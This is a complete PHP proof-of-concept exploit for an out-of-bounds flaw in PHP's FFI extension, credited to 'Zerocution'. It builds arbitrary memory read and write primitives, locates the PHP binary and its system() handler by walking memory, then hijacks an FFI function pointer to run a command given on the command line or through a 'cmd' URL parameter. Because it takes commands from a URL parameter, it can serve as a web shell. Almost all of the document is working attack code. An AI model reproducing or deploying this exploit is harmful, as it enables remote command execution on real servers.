<?php
/*

[+] PHP Latest FFI Out-of-bound
[-]     <= 8.1.0RC6
[-]     <= 8.0.13
[-]     <= 7.4.26

[+] Able to read/write an arbitrary memory address.
[+] This PoC provides a calling system() without using FFI::load() and FFI::cdefs()

[*] Exploit by Zerocution
[*] Motivated from PHP 7.4 FFI Exploitation by Hunter Gregal

*/
function pwn($cmd) {
    global $oob_obj, $oob_base;

    function allocate($amt, $fill) {
        $buf = FFI::new("char [".$amt."]");
        $bufPtr = FFI::addr($buf);
        FFI::memset($bufPtr, $fill, $amt);
        return array($bufPtr, $buf);
    }

    function ptrVal($ptr) {
        $tmp = FFI::cast("uint64_t", $ptr);
        return $tmp->cdata;
    }

    function Read($addr, $n = 8, $hex = 0) {
        global $oob_obj, $oob_base;

        $addr_gap = $addr - $oob_base;
        $str = "";
        for($i=0; $i<$n; $i++)
          $str .= chr($oob_obj[$addr_gap + $i]);

        return $hex ? bin2hex($str) : $str;
    }

    function Write($addr, $what, $n) {
        global $oob_obj, $oob_base;
        $addr_gap = $addr - $oob_base;
        for($i=0; $i < $n; $i++)
            $oob_obj[$addr_gap + $i] = ord($what[$i]);
        assert(!strcmp(Read($addr, $n), $what)); //should be succeed
    }

    function isPtr($knownPtr, $testPtr) {
        return ($knownPtr & 0xFFFFFFFF00000000) == ($testPtr & 0xFFFFFFFF00000000);
    }

    function walkSearch($segmentLeak, $maxQWORDS, $target, $size = 8, $up = 0) {
        $start = $segmentLeak;
        for($i = 0; $i < $maxQWORDS; $i++) {
            if ( $up == 0 )
                $addr = $start - (8 * $i);
            else
                $addr = $start + (8 * $i);

            $leak = unpack("Q", Read($addr))[1];
            if ( isPtr($segmentLeak, $leak) == 0 )
                continue;

            $leak2 = Read($leak, $n = $size);
            if( strcmp($leak2, $target) == 0 )
                return array($leak, $addr);
        }
        return array(0, 0);
    }

    function getBinaryBase($textLeak) {
        $start = $textLeak & 0xfffffffffffff000;
        for($i = 0; $i < 0x10000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = Read($addr, 7);
            if( strcmp($leak, "\x7f\x45\x4c\x46\x02\x01\x01") == 0 ) //ELF header
                return $addr;
        }
        return 0;
    }

    function parseElf($base) {
        $e_type = unpack("S", Read($base + 0x10, 2))[1];

        $e_phoff = unpack("Q", Read($base + 0x20))[1];
        $e_phentsize = unpack("S", Read($base + 0x36, 2))[1];
        $e_phnum = unpack("S", Read($base + 0x38, 2))[1];

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = unpack("L", Read($header, 4))[1];
            $p_flags = unpack("L", Read($header + 4, 4))[1];
            $p_vaddr = unpack("Q", Read($header + 0x10))[1];
            $p_memsz = unpack("Q", Read($header + 0x28))[1];

            if($p_type == 1 && $p_flags == 6) {
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) {
                $text_size = $p_memsz;
            }
        }
        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function getBasicFuncs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = unpack("Q", Read($data_addr + (($i + 4) * 8)))[1];
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $d1 = Read($leak, 7);
                $d2 = unpack("Q",Read($data_addr + (($i + 5) * 8)))[1];
                if(!strncmp($d1, "bin2hex", 7) && isPtr($base, $d2)) // if find correct bin2hex
                    return $data_addr + $i * 8;
            }
        }
    }

    function getSystem($basic_funcs) {
        $addr = $basic_funcs;
        do {
        $f_entry = unpack("Q", Read($addr))[1];
        printf("Debug - f_entry @ 0x%x\n", $f_entry);
        $f_name = Read($f_entry, 6);
        print("Debug - {$f_name}");
            if(!strncmp($f_name, "system", 6))
                return unpack("Q", Read($addr + 8))[1];
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function crash() { //for debug
        Write(0x0, "AAAAAAAA", 4);
    }

    function rip_spray($rip = "AAAAAAAA") { //for debug
        for($i=0;;$i++) {
            echo "Check $i\n";
            Write($oob_base + ($i * 8), $rip, 8);
        }
    }


    printf("\n[+] Starting exploit...\n");

    printf("Initalize OOB data here");
    $oob_obj = FFI::new("unsigned char[1]");
    $oob_obj = $oob_obj+0; // MAKE PHP GREAT AGAIN
    $oob_base = ptrVal($oob_obj);
    printf("[-] OOB base -> 0x%x\n\n", $oob_base);
    printf("-------\n\n");
    list($dummyPtr, $dummy) = allocate(64, 0x41);

    $dummyPtrVal = ptrVal($dummyPtr);

    $dummyPtrPtr = FFI::addr($dummyPtr);
    $dummyPtrPtrVal = ptrVal($dummyPtrPtr);

    printf("Dummy BufPtr =  0x%x\n", $dummyPtrVal);
    printf("Dummy BufPtrPtr = 0x%x\n", $dummyPtrPtrVal);
    $r = Read($dummyPtrPtrVal, 64, 1);
    printf("Dummy buf:\n%s\n", $r);
    printf("-------\n\n");

    $handlersPtrPtr = $dummyPtrPtrVal - (6 * 8);
    printf("_zend_ffi_cdata.ptr.std.handlers = 0x%x\n", $handlersPtrPtr);

    $handlersPtr = unpack("Q", Read($handlersPtrPtr))[1];
    printf("zend_ffi_cdata_handlers = 0x%x\n", $handlersPtr);


    printf("Try to find PHP ELF base\n");
    $textLeak = unpack("Q", Read($handlersPtr+16))[1];
    printf(".textLeak = 0x%x\n", $textLeak);
    $base = getBinaryBase($textLeak);
    printf("Binary Base : 0x%x\n", $base);

    if ( $base == 0 )
        die("Failed to get binary base\n");
    printf("\n%x\n", Read($base, 20, 1));
    printf("BinaryBase = 0x%x\n", $base);

    // parse elf
    if (!($elf = parseElf($base))) {
        die("failed to parseElf\n");
    }

    printf("[+] ELF data_addr->0x%x | text_size->0x%x |  data_size->0x%x\n", $elf[0], $elf[1], $elf[2]);
    if (!($basicFuncs = getBasicFuncs($base, $elf))) {
        die("failed to get basic funcs\n");
    }
    printf("BasicFuncs @ 0x%x\n", $basicFuncs);
    if (!($zif_system = getSystem($basicFuncs))) {
        die("Failed to get system\n");
    }

    printf("[+] zif_system @ 0x%x\n", $zif_system);

    $helper = FFI::new("char * (*)(const char*)");
    $helperPtr = FFI::addr($helper);

    $helperPtrVal = ptrVal($helperPtr);
    $helperPtrPtr = FFI::addr($helperPtr);
    $helperPtrPtrVal = ptrVal($helperPtrPtr);
    printf("helper.ptr_holder @ 0x%x -> 0x%x \n", $helperPtrPtrVal, $helperPtrVal);

    $helperTypePtrPtr = $helperPtrPtrVal - (2*8);
    $r = unpack("Q", Read($helperTypePtrPtr))[1];
    printf("helperType : 0x%x\n", $r);

    if(!isPtr($helperTypePtrPtr, $r))
        die("Wrong Ptr\n");
    $helperTypePtr = $r;

    $r = Read($helperTypePtr, $n=1, $hex=1);
    var_dump($r);
    if(strcmp($r, "00"))
        die("Wrong helper type");

    printf("Current Helper CDATA type @ 0x%x -> 0x%x -> ZEND_FFI_TYPE_VOID (0) \n", $helperTypePtrPtr, $helperTypePtr);

    Write($helperTypePtr, "\x10", 1);
    Write($helperPtrVal, pack("Q", $zif_system), 8, 1);

    var_dump(Read($helperPtrVal-8, 0x30, 1));

    $execute_data = str_shuffle(str_repeat("C", 5*8));
    $execute_data .= pack("L", 0);
    $execute_data .= pack("L", 1);
    $execute_data .= str_shuffle(str_repeat("A", 0x18));
    $execute_data .= str_shuffle(str_repeat("D", 8));

    $cmd_ = str_repeat("X", 16);
    $cmd_ .= pack("Q", strlen($cmd));
    $cmd_ .= $cmd . "\0";
    list($cmdBufPtr, $cmdBuf) = allocate(strlen($cmd_), 0);
    $cmdBufPtrVal = ptrVal($cmdBufPtr);
    FFI::memcpy($cmdBufPtr, $cmd_, strlen($cmd_));
    printf("cmdBuf Ptr = 0x%x\n", $cmdBufPtrVal);
    var_dump($cmdBufPtr);
    $zval = pack("Q", $cmdBufPtrVal);
    $zval .= pack("L", 6);
    $zval .= pack("L", 0);

    $execute_data .= $zval;

    $res = $helper($execute_data);

}

$cmd = "";
if(php_sapi_name() == "cli") {
    if(!isset($argv[1]))
        die("Usage: php {$argv[0]} [command]\n");
    else
        $cmd = $argv[1];
}
else {
    if(!isset($_GET["cmd"]))
        die("Usage: ".parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH)."?cmd=[command]");
    else
        $cmd = $_GET["cmd"];
}

fclose(STDOUT);
$STDOUT = fopen("pwnlog", "a");

pwn($cmd);
